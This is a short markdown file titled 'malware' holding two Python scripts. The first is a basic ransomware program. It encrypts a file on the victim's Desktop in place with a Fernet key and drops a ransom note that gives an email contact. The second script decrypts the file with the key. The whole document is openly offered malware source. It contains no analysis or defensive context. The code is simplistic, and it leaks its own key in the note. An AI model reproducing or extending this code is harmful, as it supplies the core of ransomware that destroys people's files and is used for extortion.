# malware

## ENCRYPTION PROGRAM

```
import os 
import random
import string
from cryptography.fernet import Fernet

def generate_key():
	return Fernet.generate_key()
	
def encrypt_file(file_path, key):
	fernet = Fernet(key)
	with open(file_path, 'rb') as file:
		original = file.read()
	encrypted = fernet.encrypt(original)
	with open(file_path, 'wb') as encrypted_file:
		encrypted_file.write(encrypted)

def create_ransom_note(key):
    note_content = f"All of your files have been encrypted. To unlock them, contact me at agonyecstasypiss@gmail.com with your encrpytion code. Your encrpytion code is: {key.decode()}"
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    with open(os.path.join(desktop, 'RANSOM_NOTE.txt'), 'w') as note_file:
        note_file.write(note_content)
        
def main():
    key = generate_key()
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    target_file = os.path.join(desktop, 'target_file.txt')
    encrypt_file(target_file, key)
    create_ransom_note(key)
     
if __name__ == "__main__":
    main()
```

## DECRPYTION PROGRAM

```
import os 
from cryptography.fernet import Fernet

def decrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        with open(file_path, 'rb') as file:
            encrypted = file.read()
        decrypted = fernet.decrypt(encrypted)
        with open(file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted)
    except (ValueError, TypeError) as key_error:
        print(f"Invalid encryption key")
        
def main():
    
    key = input("Enter the encryption key: ").encode()
    
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    
    target_file = os.path.join(desktop, 'target_file.txt')
    
    decrypt_file(target_file, key)
    
if __name__ == "__main__":
    main()
```
